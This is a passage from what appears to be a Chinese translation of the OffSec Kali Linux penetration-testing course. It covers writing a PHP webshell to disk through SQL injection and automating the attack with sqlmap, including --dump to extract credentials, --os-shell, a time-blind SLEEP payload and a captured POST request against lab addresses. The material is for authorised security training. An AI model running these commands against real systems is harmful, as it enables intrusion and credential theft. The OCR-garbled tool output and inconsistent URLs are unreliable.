
列表 206 - PHP 反向 shell

PHP `system` 函数将解析来自客户端 HTTP 请求的 `cmd` 参数中包含的任何语句，类似于一个 Web 交互式终端。

如果我们尝试在 `search.php` 端点的 `Lookup` 字段中使用上述有效负载，我们将收到以下错误：

![](img/987dc9f6ebd8893c565a1d124d7724e6_307_0.png)

图 162：将 WebShell 写入磁盘

幸运的是，此错误与返回类型不正确，不会影响磁盘上的 webshell。

为了确认，我们可以使用 `id` 命令访问 `tmp` 文件夹中新创建的 webshell。

![](img/987dc9f6ebd8893c565a1d124d7724e6_307_1.png)

图 163：访问 Webshell

太棒了！webshell 运行正常，因为 `id` 命令的输出通过 Web 浏览器返回给了我们。我们发现正在以 `www-data` 用户身份执行命令，该身份是 Linux 系统上 Web 服务器常用的标识。

现在我们理解了如何利用 SQLi 手动获取命令执行，让我们发现如何使用特定工具自动化此过程。

## 10.3.2 自动化攻击

我们遵循的 SQL 注入过程是通过 Kali Linux 上预装的几个工具自动化的。特别是，`sqlmap` 可以识别并利用针对各种数据库引擎的 SQL 注入漏洞。

让我们在示例 Web 应用上运行 `sqlmap`。我们将使用 `-u` 设置要扫描的 URL，并使用 `-p` 指定要测试的参数。

```bash
kali@kali:-$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```

---
--_H_-
---[J]
---[1.6#stable]
--|--|--||
--|--|()-
--|--|_||_|..._|
--|_|V...-
-- https://sqlmap.org

[*] starting @ 02:14:54 PM /2022-05-16/
[14:14:54] [INFO] resuming back-end DBMS 'mysql'
[14:14:54] [INFO] connecting to the target URL
got a 302 redirect to http://192.168.50.16/login.php?msg=2'. Do you want to
you have not declared cookie(s), while server waits to set its own
'PHPPSESSID=bf1bf5f5fc...a726bca3f'. Do you want to use this [Y]
sqlmap resumed the following injection(point) from stored session:
```

Parameter: (GET)

Type: time-blind

Title: MySQL >= 5.0.12 AND time-blind query (SLEEP)

Payload: user='1' AND (SELECT 1582 FROM (SELECT(SLEEP(5)))dtzB) AND 'hiPB'='hipB

web operating system: Linux Debian

web application technology: PHP/7.3.3, Apache 2.4.52

back-end DBMS: MySQL >= 5.0.12

[14:14:57] [INFO] fetched data logged to test files under

'/home/kali/.local/share/sqlmap/output/192.168.50.16'

[*] ending @ 02:14:57 PM /2022-05-16/
```

列表 207 - 快速寻找 SQL 注入点

我们提交了 `-u` 指定后的完整 URL，并将 `?user` 参数设置为虚拟值。启动后，我们可以在默认选项上按回车键。`Sqlmap` 随后返回确认，表明我们处理时间盲（time-blind）SQL 注入，并提供了指纹信息，如 Web 服务器操作系统、Web 应用技术栈后端数据库。

上述命令确认了目标 URL 存在 SQLi 漏洞，我们可以使用 `sqlmap` 导出数据库并窃取用户凭据来扩展操作。

# OffSec - 使用 Kali Linux 进行渗透测试

尽管 `sqlmap` 是自动化 SQLi 攻击的强大工具，但它的隐蔽性几乎为零。由于其流量巨大，在需要保持隐踪的工具作业中，不应将 `sqlmap` 作为首选。

要导出整个数据库（包括凭据），你可以运行之前的相同命令并加上 `--dump` 参数。

```bash
kali@kali:~$ sqlmap -u http://192.168.50.19/blindqli.php?user=1 -p user --dump
...
```

- *starting at 02:23:49 PM / 2022-05-16/*

[14:23:49] [INFO] resuming back-end DBMS 'mysql'
[14:23:49] [INFO] testing connection to the target URL
got a 302 redirect from http://192.168.50.160/login.php?msg=2. Do you want to
follow? [Y/n]
y have not declared cookie(s), while server waits to set its own
'PHPPSESSID=bf1bf5f5fc...a726bca3f'. Do you want to use this [Y]
sqlmap resumed the following injection(point) from stored session:
```

Parameter: (GET)

Type: time-blind

Title: MySQL >= 5.0.12 AND time-blind query (SLEEP)

Payload: user='1' AND (SELECT 1582 FROM (SELECT(SLEEP(5)))dtzB) AND 'hiPB'='hipB

web operating system: Linux Debian

web application technology: PHP/7.3.3, Apache 2.4.52

back-end DBMS: MySQL >= 5.0.12

[14:14:57] [INFO] fetched data logged to test files under

'/home/kali/.local/share/sqlmap/output/192.168.50.16'

[*] ending @ 02:14:57 PM /2022-05-16/
```

列表 208 - 使用 sqlmap 查询凭据

我们处理的是时间盲漏洞，获取整个数据库的过程缓慢，但最终我们获取了用户信息。

`sqlmap` 的另一个功能是 `--os-shell` 参数，它为我们提供了一个完全交互式的 shell。由于通常存在延迟，时间盲 SQLi 并不适用于交互 shell，因此我们使用联合查询（UNION-BASED）SQLi 示例。

首先，我们需要通过 Burp 拦截 POST 请求并保存为本地文件。

```
POST /search.php HTTP/1.1

Host: 192.168.50.19

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 9

Origin: http://192.168.50.19

Connection: close

Referer: http://192.168.50.19/search.php

Cookie: PHPSESSID=vchuisfs3400ols527lpb1kat7d

Upgrade-Requests: 1
```
